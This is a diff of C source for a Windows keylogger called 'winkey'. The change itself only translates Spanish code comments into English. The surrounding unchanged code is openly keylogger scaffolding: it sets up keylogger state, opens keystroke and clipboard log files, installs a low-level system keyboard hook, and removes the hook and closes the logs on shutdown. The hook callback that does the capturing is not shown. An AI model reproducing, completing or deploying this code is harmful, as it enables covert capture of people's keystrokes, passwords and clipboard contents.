@@ -1,6 +1,6 @@
 #include "winkey.h"
 
-// Instala el hook de teclado de bajo nivel en el sistema
+// Installs the low-level keyboard hook in the system
 static BOOL InstallKeyboardHook(void)
 {
     HINSTANCE moduleHandle;
@@ -19,7 +19,7 @@ static BOOL InstallKeyboardHook(void)
     return (g_winkeyState.keyboardHook != NULL);
 }
 
-// Inicializa el estado global del keylogger a valores por defecto
+// Initializes the global keylogger state with default values
 static void InitializeWinkeyState(void)
 {
     g_winkeyState.logFile = NULL;
@@ -28,25 +28,25 @@ static void InitializeWinkeyState(void)
     memset(g_winkeyState.lastTitle, 0, sizeof(g_winkeyState.lastTitle));
 }
 
-// Activa todos los componentes del keylogger (logs y hooks)
+// Activates all keylogger components (logs and hooks)
 BOOL ActivateHook(void)
 {
-    // Inicializa el estado del keylogger
+    // Initialize keylogger state
     InitializeWinkeyState();
 
-    // Intenta abrir el archivo de log principal
+    // Try to open main log file
     if (!OpenLogFile()) {
         return FALSE;
     }
 
-    // Intenta abrir el archivo de log del clipboard
+    // Try to open clipboard log file
     if (!OpenClipboardLog()) {
-        // El clipboard no es crítico, continúa sin él
+        // Clipboard is not critical, continue without it
     }
 
-    // Instala el hook de teclado de bajo nivel
+    // Install low-level keyboard hook
     if (!InstallKeyboardHook()) {
-        // Si falla, cierra los logs abiertos
+        // On failure, close opened logs
         if (g_winkeyState.logFile) {
             fclose(g_winkeyState.logFile);
             g_winkeyState.logFile = NULL;
@@ -58,16 +58,16 @@ BOOL ActivateHook(void)
     return TRUE;
 }
 
-// Desactiva y limpia todos los componentes del keylogger
+// Deactivates and cleans up all keylogger components
 void DeactivateHook(void)
 {
-    // Desinstala el hook de teclado si está activo
+    // Uninstall keyboard hook if active
     if (g_winkeyState.keyboardHook) {
         UnhookWindowsHookEx(g_winkeyState.keyboardHook);
         g_winkeyState.keyboardHook = NULL;
     }
 
-    // Cierra el archivo de log principal si está abierto
+    // Close main log file if open
     if (g_winkeyState.logFile) {
         fprintf(g_winkeyState.logFile, "=== Winkey Stopped ===\n");
         fflush(g_winkeyState.logFile);
@@ -75,9 +75,9 @@ void DeactivateHook(void)
         g_winkeyState.logFile = NULL;
     }
 
-    // Cierra el log del clipboard
+    // Close clipboard log
     CloseClipboardLog();
 
-    // Reinicializa el estado
+    // Reinitialize state
     InitializeWinkeyState();
 }
